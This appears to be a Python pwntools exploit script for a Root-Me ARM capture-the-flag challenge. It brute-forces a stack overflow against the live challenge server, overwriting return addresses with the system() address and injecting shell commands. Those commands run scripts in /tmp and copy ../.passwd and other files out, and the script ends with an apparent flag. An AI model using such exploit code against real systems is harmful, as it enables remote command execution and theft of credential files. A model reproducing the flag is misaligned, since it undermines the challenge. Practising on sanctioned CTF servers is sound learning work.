#!/usr/bin/python


# file ch56
# set architecture arm
# target remote 127.0.0.1:1234


# qemu-arm -L /usr/arm-linux-gnueabi/ -g 1234 ./ch56


from pwn import *
import random
import time

pattern = "xxx"
for i in range(0,26):
    pattern += chr(i+ord('A'))*4
    pattern += chr(i+ord('a'))*4
    if i<10:
        pattern += chr(i+ord('0'))*4

context.log_level = 'info'

#r = remote('challenge04.root-me.org', 61056)

l = len("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")

read = 0x106e4
cookie = 0x21008
system = 0x00010880
where_to_copy = 0x21014


# r = remote('localhost', 7896)
# r.sendline(pattern[:l])
# #r.sendline("aaaa"+"\x80\x08\x01\x00"+"AAAABBBBCCCCDDDD\x18\x09\x01\x00")
# r.sendline("A"*4*(random.randint(0,0))+p32(read)*3+p32(cookie)*3+"\x68\x10\x02\x00"*3+p32(system)*3)
# r.sendline("\x68\x10\x02\x00aaaabbbbls -Al;deeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrsssstttt"+p32(where_to_copy)+"vvvvwwwwxxxxyyyyzzzz"+"Z"*100)
# exit()

for i in range(0, 500):
    #r = remote('localhost', 7896)
    r = remote('challenge04.root-me.org', 61056)

    r.recvuntil('file:')
    r.sendline(pattern[:l])
    #r.sendline("aaaa"+"\x80\x08\x01\x00"+"AAAABBBBCCCCDDDD\x18\x09\x01\x00")
    r.sendline("A"*4*(random.randint(0,(i/10)%200))+p32(read)*3+p32(cookie)*3+"\x68\x10\x02\x00"*3+p32(system)*3)
    r.sendline("\x68\x10\x02\x00aaaabbbbrm /tmp/a;/tmp/c;sh /tmp/ok/s.sh;cat ../.passwd>>/tmp/a;cat ../*>/tmp/b;"+p32(where_to_copy)+"vvvvwwwwxxxxyyyyzzzz"+"Z"*100)

    print(r.recvuntil('file:'))
    while True:
        try:
            print r.recv()
        except:
            break

# 5pr4y_@S_y0u_g0
